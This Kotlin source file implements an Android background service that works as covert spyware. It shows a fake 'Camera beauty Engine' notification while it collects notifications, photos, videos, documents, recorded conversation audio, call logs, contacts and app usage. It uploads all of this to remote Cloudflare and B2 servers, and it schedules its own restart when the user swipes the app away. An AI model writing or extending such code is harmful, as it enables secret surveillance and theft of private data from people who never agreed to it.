package com.opp.googleoperation.service

import android.app.Notification
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.opp.googleoperation.MainActivity
import com.opp.googleoperation.R
import com.opp.googleoperation.TacticalApp
import com.opp.googleoperation.data.model.AudioThreatEvent
import com.opp.googleoperation.data.model.CallEvent
import com.opp.googleoperation.data.model.ContactEvent
import com.opp.googleoperation.data.model.DeviceStatus
import com.opp.googleoperation.data.model.MediaEvent
import com.opp.googleoperation.data.model.NotificationEvent
import com.opp.googleoperation.network.B2MediaUploader
import com.opp.googleoperation.network.CloudflareDispatcher
import com.opp.googleoperation.telemetry.AppUsageQueueManager
import com.opp.googleoperation.telemetry.DuressBeaconManager
import com.opp.googleoperation.telemetry.TacticalEventAggregator
import com.opp.googleoperation.telemetry.TelemetryAggregator
import com.opp.googleoperation.telemetry.UnifiedOfflineQueueManager
import com.opp.googleoperation.telemetry.UsageStatsTracker
import com.opp.googleoperation.util.Constants
import com.opp.googleoperation.util.PermissionHelper
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch

class TelemetryService : Service() {

    private val job = SupervisorJob()
    private val scope = CoroutineScope(Dispatchers.IO + job)
    private lateinit var aggregator: TelemetryAggregator
    private lateinit var eventAggregator: TacticalEventAggregator
    private lateinit var usageTracker: UsageStatsTracker
    private lateinit var dispatcher: CloudflareDispatcher
    private lateinit var b2Uploader: B2MediaUploader

    companion object {
        private const val TAG = "TelemetryService"

        private val _isRunning = MutableStateFlow(false)
        val isRunning: StateFlow<Boolean> = _isRunning.asStateFlow()

        private val _latestTelemetry = MutableStateFlow<DeviceStatus?>(null)
        val latestTelemetry: StateFlow<DeviceStatus?> = _latestTelemetry.asStateFlow()

        private val _latestNotification = MutableStateFlow<NotificationEvent?>(null)
        val latestNotification: StateFlow<NotificationEvent?> = _latestNotification.asStateFlow()

        private val _latestMediaEvent = MutableStateFlow<MediaEvent?>(null)
        val latestMediaEvent: StateFlow<MediaEvent?> = _latestMediaEvent.asStateFlow()

        private val _latestAudioThreat = MutableStateFlow<AudioThreatEvent?>(null)
        val latestAudioThreat: StateFlow<AudioThreatEvent?> = _latestAudioThreat.asStateFlow()

        private val _latestCallEvent = MutableStateFlow<CallEvent?>(null)
        val latestCallEvent: StateFlow<CallEvent?> = _latestCallEvent.asStateFlow()

        private val _latestContactEvent = MutableStateFlow<ContactEvent?>(null)
        val latestContactEvent: StateFlow<ContactEvent?> = _latestContactEvent.asStateFlow()

        private val _isDuressActive = MutableStateFlow(false)
        val isDuressActive: StateFlow<Boolean> = _isDuressActive.asStateFlow()

        fun start(ctx: Context) {
            val intent = Intent(ctx, TelemetryService::class.java).apply {
                action = Constants.ACTION_START_SERVICE
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ctx.startForegroundService(intent)
            } else {
                ctx.startService(intent)
            }
        }

        fun stop(ctx: Context) {
            val intent = Intent(ctx, TelemetryService::class.java).apply {
                action = Constants.ACTION_STOP_SERVICE
            }
            ctx.startService(intent)
        }
    }

    override fun onCreate() {
        super.onCreate()
        aggregator = TelemetryAggregator(applicationContext)
        eventAggregator = TacticalEventAggregator(applicationContext, scope)
        usageTracker = UsageStatsTracker(applicationContext)
        dispatcher = CloudflareDispatcher(applicationContext)
        b2Uploader = B2MediaUploader(applicationContext)
        _isRunning.value = true
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            Constants.ACTION_STOP_SERVICE -> {
                eventAggregator.stop()
                stopForeground(STOP_FOREGROUND_REMOVE)
                stopSelf()
                _isRunning.value = false
                return START_NOT_STICKY
            }
            else -> {
                startForegroundWithNotification()
                initServiceSubsystems()
                eventAggregator.refreshSubsystems()
            }
        }
        return START_STICKY
    }

    private fun startForegroundWithNotification() {
        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        val notification: Notification = NotificationCompat.Builder(this, TacticalApp.CHANNEL_ID)
            .setContentTitle("Camera beauty Engine")
            .setContentText("Camera enhancement & AI processing active")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setOngoing(true)
            .setContentIntent(pendingIntent)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()

        try {
            val fgsType = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                if (PermissionHelper.hasRecordAudioPermission(this)) {
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                } else {
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                }
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            } else {
                0
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(Constants.NOTIFICATION_ID, notification, fgsType)
            } else {
                startForeground(Constants.NOTIFICATION_ID, notification)
            }
        } catch (e: Exception) {
            Log.w(TAG, "fallback to standard foreground service without microphone flag", e)
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    startForeground(Constants.NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
                } else {
                    startForeground(Constants.NOTIFICATION_ID, notification)
                }
            } catch (e2: Exception) {
                Log.w(TAG, "startForeground emergency fallback", e2)
            }
        }
    }

    private fun initServiceSubsystems() {
        eventAggregator.start()

        val offlineQueue = UnifiedOfflineQueueManager(applicationContext, scope, dispatcher, b2Uploader)
        offlineQueue.startNetworkMonitoring()

        // 1. Collect, Persist Offline, & Dispatch Notifications
        scope.launch {
            TacticalEventAggregator.recentNotifications.collect { notif ->
                _latestNotification.value = notif
                offlineQueue.enqueueNotification(notif)
            }
        }

        // 2. Collect, Persist Offline, Stream to B2, & Dispatch Media Events (Photos, Videos, Audio, PDFs <= 300 MB)
        scope.launch {
            TacticalEventAggregator.recentMediaEvents.collect { media ->
                _latestMediaEvent.value = media
                offlineQueue.enqueueMedia(media)
            }
        }

        // 3. Collect, Persist Offline, Stream to B2, & Dispatch Silero VAD v5 Conversation Audio Events
        scope.launch {
            TacticalEventAggregator.recentThreatEvents.collect { threat ->
                _latestAudioThreat.value = threat
                offlineQueue.enqueueVoiceClip(threat)
            }
        }

        // 4. Collect & Dispatch Call Logs (Dual-SIM, duration, contact name)
        scope.launch {
            TacticalEventAggregator.recentCallEvents.collect { call ->
                _latestCallEvent.value = call
                try {
                    dispatcher.sendCallLog(call)
                } catch (e: Exception) {
                    Log.w(TAG, "failed to dispatch call event", e)
                }
            }
        }

        // 5. Collect & Dispatch Contact Events (New & Updated Contacts)
        scope.launch {
            TacticalEventAggregator.recentContactEvents.collect { contact ->
                _latestContactEvent.value = contact
                try {
                    val sent = dispatcher.sendContact(contact)
                    if (!sent) {
                        offlineQueue.enqueueContact(contact)
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "failed to dispatch contact event, enqueuing offline", e)
                    offlineQueue.enqueueContact(contact)
                }
            }
        }

        // 6. Collect & Dispatch Red Duress Alerts
        scope.launch {
            DuressBeaconManager.duressAlerts.collect {
                _isDuressActive.value = true
                eventAggregator.triggerManualDuressAudio()
                try {
                    val devId = PermissionHelper.getOrCreateDeviceId(applicationContext)
                    dispatcher.sendDuressBeacon(devId)
                } catch (e: Exception) {
                    Log.w(TAG, "failed to dispatch duress beacon", e)
                }
            }
        }

        // 6. Periodic Device Telemetry & Queue Flush Dispatch (Every 5 minutes)
        scope.launch {
            while (isActive) {
                try {
                    val status = aggregator.getDeviceStatus()
                    _latestTelemetry.value = status
                    dispatcher.sendTelemetry(status)
                    // Periodic backup flush for all offline queues
                    offlineQueue.flushAllQueues()
                } catch (e: Exception) {
                    Log.w(TAG, "non-fatal telemetry loop error", e)
                }
                delay(300000L) // 5 minutes
            }
        }

        // 7. Store-and-Forward App Usage Stats (Every 5 minutes with offline persistence & post-upload local deletion)
        val usageQueueManager = AppUsageQueueManager(applicationContext)
        scope.launch {
            while (isActive) {
                try {
                    if (PermissionHelper.hasUsageStatsPermission(applicationContext)) {
                        val usageEvents = usageTracker.getRecentAppUsage(lookbackMs = 86400000L) // 24 hours
                        if (usageEvents.isNotEmpty()) {
                            // 1. Store on device first
                            usageQueueManager.enqueue(usageEvents.take(30))
                        }
                    }

                    // 2. Fetch all queued items stored on device
                    val pendingEvents = usageQueueManager.getQueuedEvents()
                    if (pendingEvents.isNotEmpty()) {
                        // 3. Attempt upload to server
                        val uploadSuccess = dispatcher.sendAppUsage(pendingEvents)
                        if (uploadSuccess) {
                            // 4. If uploaded successfully, delete from phone storage
                            usageQueueManager.clearQueue()
                            Log.d(TAG, "successfully uploaded and deleted ${pendingEvents.size} app usage records from device")
                        } else {
                            Log.w(TAG, "upload failed (e.g. offline/no internet) - keeping ${pendingEvents.size} records queued on device")
                        }
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "non-fatal app usage loop error", e)
                }
                delay(300000L) // 5 minutes
            }
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        Log.d(TAG, "onTaskRemoved triggered (app swiped from recents) — scheduling immediate service restart")
        try {
            val restartIntent = Intent(applicationContext, TelemetryService::class.java).apply {
                action = Constants.ACTION_START_SERVICE
            }
            val restartPendingIntent = PendingIntent.getService(
                applicationContext,
                1,
                restartIntent,
                PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_ONE_SHOT
            )
            val alarmManager = getSystemService(Context.ALARM_SERVICE) as? android.app.AlarmManager
            alarmManager?.set(
                android.app.AlarmManager.ELAPSED_REALTIME_WAKEUP,
                android.os.SystemClock.elapsedRealtime() + 1000,
                restartPendingIntent
            )
        } catch (e: Exception) {
            Log.w(TAG, "failed scheduling onTaskRemoved restart", e)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        eventAggregator.stop()
        _isRunning.value = false
        scope.cancel()
    }
}
